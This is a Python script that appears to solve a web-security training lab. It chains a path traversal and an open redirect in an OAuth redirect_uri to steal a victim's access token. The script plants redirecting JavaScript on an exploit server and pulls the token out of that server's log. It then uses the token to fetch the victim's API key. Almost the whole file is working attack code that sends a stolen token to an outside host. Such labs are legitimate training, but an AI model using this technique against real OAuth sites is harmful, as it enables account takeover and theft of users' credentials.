import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_url = exploit_url.rstrip('/').lstrip('https://')

# Get from auth request during login process
oauth_server_url = ''
client_id = ''

# Craft a malicious url that uses the traversal and open redirect.
# Send victim to the exploit server and log their access token
malicious_url = f'https://{oauth_server_url}/\
auth?client_id={client_id}&redirect_uri=https://{site}/\
oauth-callback/../post/next?path=https://{exploit_url}/\
exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
exploit_script = f'''<script>
    if (!document.location.hash) {{
        window.location = '{malicious_url}'
    }} else {{
        window.location = '/?'+document.location.hash.substr(1)\n
    }}
</script>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_script,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(f'https://{exploit_url}/', data=formData)

# Retrieve the access token from the exploit log
exploit_log = f'https://{exploit_url}/log'
resp = s.get(exploit_log)
log_text = resp.text
token_index = log_text.rfind("token=")
token = log_text[token_index+6:token_index+49]

# Send the request to the OAuth server with the stolen token
me_url = f'https://{oauth_server_url}/me'
header_data = {
    'Authorization' : f'Bearer {token}'
}
resp = s.get(me_url, headers=header_data)

# Retrieve and submit the apikey from the victim to solve the level
secret_key = resp.json()['apikey']
solution_url = f'http://{site}/submitSolution'
resp = s.post(solution_url, data={'answer': secret_key})